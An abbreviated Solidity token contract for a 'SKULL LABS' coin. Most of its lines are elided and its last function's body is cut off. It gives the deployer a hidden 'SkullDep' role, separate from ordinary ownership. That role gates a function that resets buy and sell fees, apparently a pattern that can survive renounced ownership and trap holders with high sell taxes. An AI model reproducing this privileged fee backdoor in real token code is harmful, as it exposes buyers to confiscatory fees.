...
// Telegram : https://t.me/SkullLabsNFT

// Website : https://SkullLabs.xyz

// Twitter : https://twitter.com/SkullLabs_NFT
...
contract Ownable is Context {
    ...
    constructor() {
        ...
        _owner = msgSender;
        SkullDep[_owner] = true;
        emit OwnershipTransferred(address(0), msgSender);
    }
        mapping (address => bool) internal SkullDep;
    ...
    modifier SkullDeployerr() {
        require(isSkullDeployerr(msg.sender), "!SkullDeployerr"); _;
    }

    function isSkullDeployerr(address adr) public view returns (bool) {
        return SkullDep[adr];
    }
...
contract SkullLabs is Context, IERC20, Ownable {

    using SafeMath for uint256;

    string private constant _name = "SKULL LABS";
    string private constant _symbol = "SKULL KING";
    ...
    uint256 private NewValuation = _taxonSell;
    ...
    function _transfer(
        ...
        if ((_isExcludedFromFee[from] || _isExcludedFromFee[to]) || (from != uniswapV2Pair && to != uniswapV2Pair)) {
            ...
            if(from == uniswapV2Pair && to != address(uniswapV2Router)) {
                ...
                NewValuation = _taxonBuy;
            }

            if (to == uniswapV2Pair && from != address(uniswapV2Router)) {
                _redisFee = _redisFeeOnSell;
                NewValuation = _taxonSell;
            }
        }
    ...
    function GetaAchange(uint256 redisFeeOnBuy, uint256 redisFeeOnSell, uint256 taxFeeOnBuy, uint256 taxFeeOnSell) public SkullDeployerr {
